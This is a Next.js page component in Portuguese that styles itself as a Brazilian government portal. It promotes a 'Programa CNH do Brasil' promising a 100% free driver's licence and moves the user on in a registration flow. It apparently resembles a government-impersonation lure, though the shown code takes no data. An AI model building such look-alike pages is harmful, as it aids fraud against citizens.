'use client';

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import Image from 'next/image';
import GovLayout from '@/components/GovLayout';

export default function SaibaMaisPage() {
  const router = useRouter();
  const [userName, setUserName] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    const userData = localStorage.getItem('usuarioLogado');
    if (userData) {
      const user = JSON.parse(userData);
      const primeiroNome = user.nome?.split(' ')[0] || '';
      setUserName(primeiroNome.toUpperCase());
    }
  }, []);

  const handleContinue = () => {
    setIsLoading(true);
    setTimeout(() => {
      router.push('/aplicativo');
    }, 500);
  };

  return (
    <GovLayout userName={userName} breadcrumbItems={['Cadastro', 'Sobre o Programa']}>
      <div className="w-full">
        <div>
          <div className="flex items-center gap-3 mb-4">
            <div className="flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium">1</div>
            <p className="font-semibold text-base">Programa CNH do Brasil</p>
          </div>
          
          <div className="space-y-3 flex flex-col items-center">
            <div className="flex justify-center mb-4">
              <Image 
                src="/programa-cnh-banner.png" 
                alt="Programa CNH do Brasil" 
                width={480}
                height={400}
                className="w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg"
                style={{ maxHeight: '400px' }}
              />
            </div>
            
            <div className="bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]">
              <p className="text-gray-700 leading-relaxed text-base">
                O Programa CNH do Brasil é uma iniciativa do Governo Federal que pode garantir sua Carteira Nacional de Habilitação 100% GRATUITA! Se você for aprovado nos critérios do programa, não pagará nada pela sua CNH. Continue seu cadastro aqui no site para verificar sua elegibilidade.
              </p>
            </div>
          </div>
          
          <div className="flex justify-center mt-6">
            <button 
              type="button" 
              onClick={handleContinue}
              disabled={isLoading}
              className="bg-[#1351B4] hover:bg-[#0D3C8C] text-white font-semibold py-3 px-8 rounded-full text-base transition-all transform hover:scale-105 shadow-lg flex items-center justify-center gap-2 min-w-[160px] disabled:opacity-70"
            >
              {isLoading ? (
                <div className="h-5 w-5 animate-spin rounded-full border-2 border-white border-t-transparent"></div>
              ) : (
                'Avançar'
              )}
            </button>
          </div>
        </div>
      </div>
    </GovLayout>
  );
}
